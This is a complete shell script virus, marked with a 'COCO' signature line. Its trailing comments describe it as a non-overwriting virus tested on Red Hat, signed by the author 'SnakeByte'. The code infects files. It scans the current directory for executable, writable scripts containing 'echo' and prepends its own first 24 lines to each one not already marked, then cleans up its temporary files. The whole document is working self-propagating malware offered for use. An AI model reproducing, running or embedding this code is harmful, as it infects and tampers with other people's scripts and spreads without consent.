# COCO
head -n 24 $0 > .test
 for file in *
 do
   if test -f $file
   then
       if test -x $file
       then
            if test -w $file
            then
              if grep -s echo $file >.mmm
              then
                head -n 1 $file >.mm
                if grep -s COCO .mm >.mmm
                then
                rm .mm -f
                else
                 cat $file > .SAVEE
                 cat .test > $file
                 cat .SAVEE >> $file
   fi; fi; fi; fi; fi
 done
rm .test .SAVEE .mmm .mm -f

#This is a non overwritting shell script virus testet with redhat
#if you like it send comments to SnakeByte@gmx.de
# *g* SnakeByte